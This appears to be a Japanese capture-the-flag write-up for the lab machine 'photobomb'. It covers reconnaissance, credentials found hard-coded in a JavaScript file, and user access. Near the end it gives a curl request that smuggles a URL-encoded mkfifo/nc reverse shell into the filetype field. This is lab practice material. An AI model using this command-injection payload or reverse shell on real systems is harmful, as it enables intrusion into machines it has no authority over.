# photobomb
## とりあえずnmap
nmap -sV -T4 10.10.11.182

開いているポートは
22/tcp open  tcpwrapped
80/tcp open  http       nginx 1.18.0 (Ubuntu)

## 接続できない問題
以下のリンクにリダイレクトされる。
http://photobomb.htb/

sudo vim /etc/hosts
10.10.11.182  photobomb.htb

## 分かっている情報
nginx/1.18.0 (Ubuntu)
/printerが認証ページ
サポートチームの連絡先？：4 4283 77468377

## 他のページが存在しないか確認する
### gobuster
gobuster dir -u photobomb.htb -w /usr/share/wordlists/dirb/common.txt
404ページ以外に見つかったページは
- /printer
- /printers

どっちも認証が必要。。。

### ４０４ページ
Rubyでかかれているっぽい？
Sinatraって何だろう？
http://127.0.0.1:4567/__sinatra__/404.png

### /printer /printers
どちらもusername と password が必要。

### /photobomb.js
```javascrpt
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

### 分かったユーザ名とパスワードでssh接続できないのか？
tcpwrappersってのが邪魔でできないっぽい
https://48n.jp/blog/2016/06/06/guide-tcpwrappers/

### POSTするときにコマンドやスクリプトが実行できないか
と考えたけど、ここから知識がなくて進まない。
ねたばれみた
リバースシェルを作るらしい。
https://www.revshells.com/
`nc mkfifo`で作る
```
curl -X POST 'http://pH0t0:b0Mb!@photobomb.htb/printer' -d "photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.33%20443%20%3E%2Ftmp%2Ff&dimensions=3000x2000"
```
これで通った。
filetype=jpgのあとに`;`をつけることによってコマンドが実行できるらしい。

# あとはフラグ探すだけ
rootはまた今度。やれたらやるわw

